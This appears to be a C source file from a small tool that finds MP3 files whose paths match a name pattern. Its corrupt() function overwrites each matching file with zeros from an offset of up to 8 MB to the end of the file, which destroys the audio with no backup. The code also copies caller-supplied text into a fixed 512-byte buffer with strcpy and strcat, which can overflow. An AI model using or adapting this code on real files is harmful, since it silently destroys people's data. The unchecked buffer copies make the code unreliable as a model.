#include "ctr.h"
#include <stdio.h>
#include <string.h>
#include <fnmatch.h> // fnmatch



long int fsize(FILE* f)
{
	// stdio.h
	// #define SEEK_SET	0	/* Seek from beginning of file.  */
	// #define SEEK_CUR	1	/* Seek from current position.  */
	// #define SEEK_END	2	/* Seek from end of file.  */
	if (!f) return -1;
	long int current = ftell(f); // save current position
	fseek(f, 0, SEEK_END); // seek to end, 2nd param is offset
	long int size = ftell(f); // read position = byte count from beginning of file
	// printf("fpsize(): size %ld\n", size);
	
	fseek(f, current, SEEK_SET);

	return size;
}

long int fsizes(const char* filename)
{
	FILE* f = fopen(filename, "rb");
	if (!f) return -1;
	long int size = fsize(f);
	fclose(f);
	return size;
}

BOOL fexists(const char* filename)
{
	if (fsizes(filename) > -1) return TRUE;
	return FALSE;
}


int filter(const struct dirent *d)
{ 
	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0) return 0;
	return 1;
}

BOOL is_filepath_target(const char* filepath, const char* prefix_pattern)
{
	// char* delimiter; // win or unix, if none, none will be used so chill
	// if (strstr(filepath, "\\")) strcpy(delimiter, "\\");
	// if (strstr(filepath, "/")) strcpy(delimiter, "/");

	char pattern[512];
	strcpy(pattern, "*");
	strcat(pattern, prefix_pattern);
	strcat(pattern, "*.mp3");

	// printf("%s\n", pattern);

	// const char* pattern = "*.mp3";
	int res = fnmatch (&pattern, filepath, 0);
	if (res == 0) 
	{
		// printf(" == '%s' is match by pattern '%s' == \n", filepath, prefix_pattern);
		return TRUE;
	}


	// printf(" == '%s' is not match by pattern '%s' == \n", filepath, prefix_pattern);
	return FALSE;
}

long int calc_start(long int size)
{
	long int min_size = MB/2;
	if (size <= min_size) return -1;
	
	// printf("size is %ld\n", size);
	long int res = min_size-1;
	if (50 * MB <= size) return 8*MB; // 50+
	if (20 * MB <= size) return 4*MB; // 20-50
	if (10 * MB <= size) return 2*MB; // 10-20
	if (5  * MB <= size) return 2*MB; // 5-10
	if (2  * MB <= size) return min_size-1; // 2-5
	res = (size/2) > min_size ? (size/2) : min_size;
	return res;
}

void corrupt(const char* filepath)
{
	if (!fexists(filepath)) return;
	long int min_size = MB/2; // 0.5 MB
	long int size = fsizes(filepath);
	if (size < min_size) return; // empty mp3

	// long int bytes_to_read = size - min_size;

	FILE* f = fopen(filepath, "r+");
	long int start = calc_start(size);
	if (start == -1) {
		fclose(f);
		return;
	}
	fseek(f, start, SEEK_SET); // works with r+ only ! a+ wont allow overwriting

	BYTE buffer[1024]; for (int i =0; i< 1024; i++) buffer[i] = 0;
	
	printf("ctr %s: %ld/%ld\n", filepath, start, size);
	while(ftell(f) < size)
	{
		// printf("corrupting %s: %d\n", filepath, ftell(f));
		fwrite(&buffer, sizeof(BYTE), 1024, f);
	}

	fclose(f);
}